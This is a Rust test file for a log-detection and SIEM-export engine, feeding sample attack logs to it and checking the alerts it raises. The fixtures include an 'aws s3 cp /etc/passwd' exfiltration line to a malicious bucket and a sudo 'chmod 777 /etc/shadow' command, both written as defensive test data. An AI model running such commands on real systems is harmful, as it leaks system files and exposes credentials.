use chrono::Utc;
use defudolog_lib::db::Database;
use defudolog_lib::engine::DetectionPipeline;
use defudolog_lib::models::{AlertLevel, AppSettings, DetectionRule, LogSource, RuleType, SourceType};
use defudolog_lib::siem_exporter::SiemExporter;
use std::sync::Arc;

fn setup_test_engine() -> (DetectionPipeline, Arc<Database>) {
    let tmp_db_path = format!("{}/defudolog_test_{}.db", std::env::temp_dir().display(), uuid::Uuid::new_v4());
    let db = Arc::new(Database::new(&tmp_db_path).expect("DB initialization failed"));
    
    // Insérer les sources nécessaires pour satisfaire la clé étrangère
    let now = Utc::now();
    for src_id in &["source_test", "auth_source", "syslog_source", "web_source", "custom_source"] {
        let source = LogSource {
            id: src_id.to_string(),
            name: format!("Test Source {}", src_id),
            source_type: SourceType::FileWatcher { path: "/var/log/test.log".to_string(), pattern: "*.log".to_string() },
            hostname: "test-host".to_string(),
            os: "linux".to_string(),
            enabled: true,
            config: serde_json::json!({}),
            created_at: now,
            updated_at: now,
        };
        let _ = db.insert_log_source(&source);
    }

    let settings = AppSettings::default();
    let engine = DetectionPipeline::new_headless(db.clone(), settings.detection);
    (engine, db)
}

#[test]
fn test_dlp_data_leak_detection() {
    let (mut engine, _db) = setup_test_engine();
    let now = Utc::now();

    let raw_log = "POST /api/v1/export HTTP/1.1 payload contains BEGIN RSA PRIVATE KEY and 1000 credit_cards";
    let alert = engine.process_log("source_test", "prod-srv-01", raw_log, now)
        .expect("Processing failed");

    assert!(alert.is_some(), "DLP Data leak should generate an alert");
    let alert = alert.unwrap();
    assert_eq!(alert.level, AlertLevel::High, "DLP alert must be High severity");
    assert!(alert.reasons.iter().any(|r| r.contains("DLP") || r.contains("fuite") || r.contains("Template") || r.contains("RSA") || r.contains("Sensible")), "Reasons should mention threat");
}

#[test]
fn test_privilege_escalation_detection() {
    let (mut engine, _db) = setup_test_engine();
    let now = Utc::now();

    let raw_log = "sudo: eviluser : TTY=pts/1 ; PWD=/home/eviluser ; USER=root ; COMMAND=/bin/chmod 777 /etc/shadow";
    let alert = engine.process_log("source_test", "srv-linux-01", raw_log, now)
        .expect("Processing failed");

    assert!(alert.is_some(), "Privilege escalation should generate an alert");
    let alert = alert.unwrap();
    assert_eq!(alert.level, AlertLevel::High, "Privilege escalation must be High severity");
}

#[test]
fn test_brute_force_authentication_burst() {
    let (mut engine, _db) = setup_test_engine();
    let now = Utc::now();

    let mut generated_alerts = Vec::new();
    for i in 0..15 {
        let log_line = format!("sshd[{}]: Failed password for invalid user admin from 192.168.1.105 port 42890 ssh2", 1000 + i);
        if let Ok(Some(alert)) = engine.process_log("auth_source", "bastion-01", &log_line, now + chrono::Duration::milliseconds(i * 100)) {
            generated_alerts.push(alert);
        }
    }

    assert!(!generated_alerts.is_empty(), "Brute force burst should trigger alerts");
}

#[test]
fn test_system_anomaly_crash_detection() {
    let (mut engine, _db) = setup_test_engine();
    let now = Utc::now();

    let raw_log = "kernel: [12948.102] Out of memory: Kill process 8912 (mysqld) score 920 or sacrifice child";
    let alert = engine.process_log("syslog_source", "db-cluster-01", raw_log, now)
        .expect("Processing failed");

    assert!(alert.is_some(), "System crash/OOM should trigger alert");
    let alert = alert.unwrap();
    assert!(alert.level == AlertLevel::High || alert.level == AlertLevel::Moderate);
}

#[test]
fn test_benign_operational_log_no_false_alarm() {
    let (mut engine, _db) = setup_test_engine();
    let now = Utc::now();

    let normal_log = "GET /healthz HTTP/1.1 200 OK 0.002s";
    let alert = engine.process_log("web_source", "web-01", normal_log, now)
        .expect("Processing failed");

    assert!(alert.is_none(), "Normal healthcheck log should not trigger an alert");
}

#[test]
fn test_siem_exports_formats() {
    let (mut engine, _db) = setup_test_engine();
    let now = Utc::now();

    let raw_log = "exfiltration to s3 bucket aws s3 cp /etc/passwd s3://malicious-bucket/";
    let alert = engine.process_log("source_test", "host-01", raw_log, now)
        .expect("Processing failed")
        .expect("Alert expected");

    let alerts = vec![alert];

    let cef = SiemExporter::export_batch(&alerts, "cef");
    assert!(cef.contains("CEF:0|DeFuDoLog|Platform|2.0|"), "CEF format invalid");

    let leef = SiemExporter::export_batch(&alerts, "leef");
    assert!(leef.contains("LEEF:2.0|DeFuDoLog|Platform|2.0|"), "LEEF format invalid");

    let syslog = SiemExporter::export_batch(&alerts, "syslog");
    assert!(syslog.starts_with('<') && syslog.contains("defudolog"), "Syslog RFC 5424 format invalid");
}

#[test]
fn test_custom_rule_engine_integration() {
    let (mut engine, db) = setup_test_engine();
    let now = Utc::now();

    // Insérer une règle personnalisée
    let custom_rule = DetectionRule {
        id: "rule_custom_1".to_string(),
        name: "Confidential Project Keyword".to_string(),
        description: "Détecte le nom de projet confidentiel PROJECT_TITAN".to_string(),
        rule_type: RuleType::Regex,
        pattern: r"(?i)PROJECT_TITAN".to_string(),
        severity: AlertLevel::High,
        enabled: true,
        created_at: now,
    };
    db.upsert_rule(&custom_rule).expect("Insert rule failed");

    let raw_log = "User dev01 downloaded confidential document PROJECT_TITAN_SPEC.pdf";
    let alert = engine.process_log("custom_source", "workstation-01", raw_log, now)
        .expect("Processing failed");

    assert!(alert.is_some(), "Custom rule must trigger an alert");
    let alert = alert.unwrap();
    assert_eq!(alert.level, AlertLevel::High);
    assert!(alert.reasons.iter().any(|r| r.contains("Confidential Project Keyword")));
}
